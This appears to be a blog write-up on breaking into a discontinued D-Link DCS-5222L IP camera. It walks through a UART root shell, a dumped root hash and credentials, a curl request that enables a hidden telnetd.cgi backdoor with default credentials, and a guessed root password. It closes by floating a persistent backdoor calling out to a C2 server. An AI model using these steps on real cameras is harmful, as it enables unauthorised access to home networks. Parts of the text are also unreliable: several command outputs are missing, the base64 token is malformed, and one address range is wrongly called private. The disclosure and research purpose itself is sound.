# Hacking D-Link's DCS-5222L IP camera
As the US considers a potential ban on TP-Link, many people might find themselves needing to replace their routers, IP cameras, or NAS devices. In the event of such a ban, consumers are likely to rush into purchasing devices from competitors like D-Link or Asus, even if their current devices remain unaffected. To those considering this switch, I advise: don’t rush. Choose your new devices carefully, because, as we’ll explore today, products from these brands may still have vulnerabilities that attackers can exploit to gain remote code execution.

This post serves as an introduction to the art of hardware and embedded systems hacking. We’ll examine how an IP camera can be hacked, covering everything from hardware to firmware. Along the way, we’ll delve into key concepts such as hardware and embedded systems hacking, UART interfaces, enumeration, and backdoors.

## D-Link DCS-5222L
The DCS product line features IP security cameras that almost anyone can install at home with minimal effort or technical knowledge. These cameras are often an attractive solution for home networks because they’re both more affordable and easier to set up than traditional CCTV systems.

However, the downside is that these devices may be exploitable. In the worst-case scenario, an attacker could gain full access to your network or recruit the device into a botnet.

For this demonstration, I’m using the D-Link DCS-5222L IP camera. This legacy device, released in 2010, had its support officially discontinued by D-Link in 2019. It’s important to note the exact hardware model and firmware version being tested.

</div>

In my case, the camera is hardware model A1 with firmware version 1.11. Keep in mind that newer versions may introduce additional caveats, such as a login prompt or missing files. The hardware model can be found on the label at the bottom of the camera, while other details—such as firmware features—can be identified through the web interface, boot logs, documentation, or binaries within the device's system.

</div>

The first step I took was installing the camera without any additional configuration.
## Device services and exposed ports
Now let’s dive into the hacking process. First, we’ll start by scanning the device using **nmap**:
```bash
$ nmap <ipv4> -A -n -sV
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-27 19:34 -03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.87 seconds
```

From the scan results, we can see the device has five exposed services:

1. An HTTP web portal.
2. An HTTPS web portal with an expired SSL certificate (rendering it non-functional).
3. An RTSP service for video streaming.
4. Two UPnP (Universal Plug and Play) services.

We’ll focus on the HTTP web portal for now. The server appears to be based on **lighttpd**, a detail we can later confirm during the analysis.
### HTTP web portal
First, let’s explore the web portal. Upon accessing it, we are immediately prompted to enter credentials.

<div align=center>
    <img src="assets/login.png" width="500" />
</div>

Since I hadn’t configured the device, we can use the default credentials:
```
# Default credentials
username = "admin"
password = ""
```
Using these, we gain access to the portal. This is where the vulnerability becomes apparent. This type of exploit is known as an **Authenticated Attack**, which is very common in embedded devices such as routers and IP cameras.

<div align=center>
    <img src="assets/camindex.png" width="600" />
</div>

Additionally, we can see the firmware version (1.11) displayed in the top-right corner of the interface.
## Firmware Analysis
To determine how to attack the web portal, we’ll have better chances if we first analyze parts of the firmware. There are three main approaches for this:

1. Finding the firmware online.
2. Dumping the firmware directly from the device.
3. Logging into the device and reading the source from within.

For this demonstration, we’ll focus on the third option: reading the firmware from inside the device.
### UART interface
Finally, we can work directly with the hardware. Most embedded devices include an interface that allows communication with the hardware, but the challenge is identifying where this interface is located. Sometimes, specialized probes are needed to connect directly to the SoC’s pins. However, back when this camera was released, it was common for manufacturers to leave these interfaces exposed, particularly the **UART interface** (Universal Asynchronous Receiver-Transmitter).

Connecting to the UART interface allows us to access system logs and even opens a shell over a TTY terminal, which can be incredibly useful. In this case, my firmware version provides a root shell, granting full access to the device’s system.
#### Finding the UART pins
The first step is locating the UART port or pins on the device. After disassembling the bottom of the camera, I quickly found the port. While it wasn’t explicitly labeled as UART, the pins were marked with standard labels:

- **G** = Ground (GND)
- **R** = Receive (RX)
- **T** = Transmit (TX)
- **V** = Voltage (VCC)

<div align=center>
    <img src="assets/camuart.png" width="500" />
</div>

To translate UART protocol to USB protocol, I used an **FT232 USB-UART interface**.
#### Voltage considerations
It’s critical to determine whether the device operates at 3.3V or 5V, as using the wrong voltage can damage the device or even your computer. Using a multimeter, I confirmed that the device operates at 3.3V. This was evident because the voltage between the ground and TX pins fluctuated but never exceeded approximately 3.3V, indicating active data transmission.



<div align=center>
    <img src="assets/multiuart.png" width="300" />
    <img src="assets/multiuart2.png" width="300" />
</div>



#### Connecting to the UART
I didn’t have the specific UART connector for the port, but I improvised by using another connector and a Dupont cable to establish the connection.


<div align=center>
    <img src="assets/uartconnection.png" width="500" />
</div>

Once the cables and USB interface were connected, I used tools like `screen`, `picocom`, or `puTTY` to read the data stream. Typically, UART interfaces communicate at **115200 baud**, but this device operates at a slower rate of **38400 baud**.
```bash
$ sudo screen /dev/ttyUSB0 38400
```
#### Analyzing the logs
Upon connection, the logs began streaming:
```

```
From the logs, I identified the device runs **Linux kernel version 2.6.28**, compiled with **GCC version 4.4.0**. After reading through the boot and kernel logs, a shell opened, revealing that the device uses **BusyBox v1.20.2**—a common operating system for embedded devices. BusyBox provides access to numerous useful binaries.


<div align=center>
    <img src="assets/uart-shell.png" width="600" />
</div>


At this point, we can start exploring binaries and other interesting parts of the system for further analysis.
### System enumeration
#### Environment variables
First of all, lets take a look into the environment variables:
```
# set
HOME='/'
IFS='
'
LOGNAME='root'
PATH='/bin:/sbin:/usr/bin:/usr/sbin'
PPID='2376'
PS1='# '
PS2='> '
PS4='+ '
PWD='/'
SHELL='/bin/sh'
USER='root'
_='PATH=/bin:/sbin:/usr/bin:/usr/sbin'
```
Here, we confirm the device is running as the `root` user, with `/` as both the home and working directory. The shell is a classic `sh`, and the binaries' path includes common directories: `/bin`, `/sbin`, `/usr/bin`, and `/usr/sbin`. Next, we investigate the binaries.
#### Exploring Available Binaries
Listing the binaries across directories reveals a trove of information:
```

brctl        poff         popmaildir   sendmail
ez-ipupdate  pon          pppd         telnetd
```
Among them, we spot the **`telnetd`** binary. This indicates the device supports `telnet`, a network protocol notorious for its lack of encryption. This is alarming, as `telnetd` effectively functions as a backdoor for accessing the device. The inclusion of such a service in production firmware —which maybe was intended only for development environments— is unacceptable. Manufacturers continuing to ship devices with these vulnerabilities is a significant security oversight.
#### User credentials
To facilitate remote access via `telnet`, we extract the root user's hashed password:

```
# cat /etc/passwd /etc/shadow
root:x:0:0:Linux User,,,:/:/bin/sh
root:$1$gmEGnzIX$bFqGa1xIsjGupHyfeHXWR/:20:0:99999:7:::
```
This hash can later be cracked using tools like **hashcat** to reveal the plaintext password. Although we won't need this.
#### System Configuration Files
Listing the `/etc` directory:
```
# ls /etc
RT2870STA.dat     group             mdev.conf         profile           shadow
TZ                hostname          network           protocols         wired.ico

die() {
        echo $@
        exit 1
}

showUsage() {
        die "$0 {start|stop}"
}

action=$1
end=$2

[ "$end" = "" ] && [ "$action" != "" ] || showUsage

start() {
        #touch /tmp/group /tmp/passwd /tmp/shadow
        #echo 'root:x:0:' > /etc/group
        #echo 'root:x:0:0:Linux User,,,:/:/bin/sh' > /etc/passwd
        #echo 'root:$1$gmEGnzIX$bFqGa1xIsjGupHyfeHXWR/:20:0:99999:7:::' > /etc/shadow
        /bin/agent &

        # remove loaded drivers
        rm -rf /lib/modules/*

        BurnInEnable_byte=`tdb get BurnIn BurnInEnable_byte`
        [ "$BurnInEnable_byte" -eq "1" ] && BurnInTest.sh start &
        echo "rc.local start ok."
}

stop() {
        #addlog System is rebooting.
        echo "rc.local stop ok."
}

case $action in
        start)
                start
        ;;
        stop)
                stop
        ;;
        *)
                showUsage
        ;;
esac

exit 0
```
(Un)shockingly, the `rc.local` file contains hardcoded root credentials. This practice is indefensible in any context, let alone in a production device.
#### Configuration Database
Further inspection of `/etc/db` and `/tmp/db` yields:
```
# ls /etc/db
default.xml  server.pem
# ls /tmp/db
db.xml       default.xml  server.pem
# cat /tmp/db/db.xml
...
<_AdminUser type="3" content="admin" />
<AdminPasswd type="3" content="" />
...
```
Hey! The admin credentials! Guess if you forget it can search it here! (you indeed can). 
#### File System and Persistance
Lets look at the filesystems:
```
# mount
rootfs on / type rootfs (rw)
proc on /proc type proc (rw)
tmpfs on /tmp type tmpfs (rw,size=34816k)
mdev on /dev type tmpfs (rw,size=512k)
devpts on /dev/pts type devpts (rw,mode=600)
sysfs on /sys type sysfs (rw)
none on /proc/bus/usb type usbfs (rw)
/dev/mtdblock1 on /opt type cramfs (ro)

# df
Filesystem           1024-blocks    Used Available Use% Mounted on
tmpfs                    34816       224     34592   1% /tmp
mdev                       512         0       512   0% /dev
/dev/mtdblock1             412       412         0 100% /opt
```
So although the rootfs shows as read-write, it has no persistance, meaning any modifications you make to the system will no persist in between boots. Thats why we haven't just written a script for setting up the `telnetd` daemon.
### Network traffic
We can also try to discover unwanted network traffic. 
#### Routing Table
Lets look at the routing table
```
# netstat -r
Kernel IP routing table

Here we learn that there exists IPv4s on ranges 192.168.0.0/16 and 231.1.1.0/24, that are common for homes and small offices private networks. We caught attention on the 239.255.255.250 address. Upon a quick search we find that this IP is reserved for the WS-Discovery service (Web Services Dynamic Discovery Protocol) that runs over port `3702/udp`.

Look at that! A file in the route `cgi/admin/telnetd.cgi` exists! There's no way they left a way for setting up the backdor via the web interface, this has to be on purpouse, or as I prefer to call it, a *backdoor-by-design*.
## Leveraging the backdoor
Although the file is in ELF format (executable and linkable format), so the data is binary, we can still try to read strings from it:
```
...
command
on
/usr/sbin/telnetd 1>/dev/null 2>/dev/null
telnetd is started successfully. Please use telnet to login console.
off
killall telnetd 1>/dev/null 2>/dev/null
telnetd is stopped successfully.
unknown command. Please specify 'on' or 'off'.
...
```
From this, we speculate that we have to pass a command to the request. Lets try with the url parameter `?command=on`

<div align=center>
    <img src="assets/telnetdcgi.png" width="700" />
</div>

Boom! Backdoored. Now we can do it from the terminal. Note the auth token. This is the truncated base64 (no padding) string `username:password`, in this case `admin:`
``` bash
$ curl "http://192.168.1.23/cgi/admin/telnetd.cgi?command=on" --header "Authorization: Basic YWRtatW46"
# ...<b>telnetd is started successfully. Please use telnet to login console.</b>...
```
#### Cracking the root password hash
Now lets try logging in
```
$ telnet 192.168.1.23
Trying 192.168.1.23...
Connected to 192.168.1.23.
Escape character is '^]'.

DCS-5222L login:
```
Here we get promted with login credentials. I literaly guessed the password on my third try. It was `root:admin`. So easy.
## Conclusion
This security audit of the D-Link DCS-5222L reveals a number of vulnerabilities that could be exploited to gain unauthorized access to the device. The default root credentials, the existence of a backdoor via the `telnetd.cgi` script , and the lack of a login promt via UART interface highlight a fundamental lack of security best practices.  Despite the lack of persistent changes across reboots, the device remains vulnerable to unauthorized access through the web interface and weak default credentials.
## Future work
Regardless what we did here, many things did not get resolved. In the future, a good idea may be to work with the latest firmware version and patching the firmware for a persistant telnet service, or worse, with an outbounding connection to a C2 (command and control) server.
